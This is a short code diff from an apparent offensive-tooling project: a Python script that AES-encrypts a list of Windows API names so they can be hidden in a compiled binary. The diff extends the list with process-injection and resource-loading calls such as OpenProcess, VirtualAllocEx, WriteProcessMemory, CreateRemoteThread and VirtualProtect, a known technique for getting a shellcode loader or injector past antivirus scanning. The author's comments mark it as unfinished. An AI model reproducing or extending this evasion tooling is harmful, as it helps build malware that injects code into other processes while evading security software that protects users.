@@ -11,13 +11,13 @@ cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
 
 # Need to fix
 # Issue with string to bytes I think
-# Also add main functions
 
 stringNames = ["KERNEL32.DLL", "GetModuleHandleW", "GetProcAddress", "CloseHandle", "LoadLibraryA",
 			   "ADVAPI32.DLL", "CryptAcquireContextW", "CryptCreateHash", "CryptHashData", "CryptDeriveKey",
 			   "CryptDecrypt", "CryptReleaseContext", "CryptDestroyHash", "CryptDestroyKey", "GetModuleHandleW",
 			   "CreateToolhelp32Snapshot", "Process32First", "Process32Next", "lstrcmpiA", "VirtualAllocEx",
-			   "WriteProcessMemory", "CreateRemoteThread", "WaitForSingleObject"]
+			   "WriteProcessMemory", "VirtualProtect", "CreateRemoteThread", "WaitForSingleObject", "FindResourceA",
+			   "LoadResource", "LockResource", "SizeofResource", "VirtualAlloc", "RtlMoveMemory", "OpenProcess"]
 
 for i in range(len(stringNames)):
 	plaintext = stringNames[i].encode()
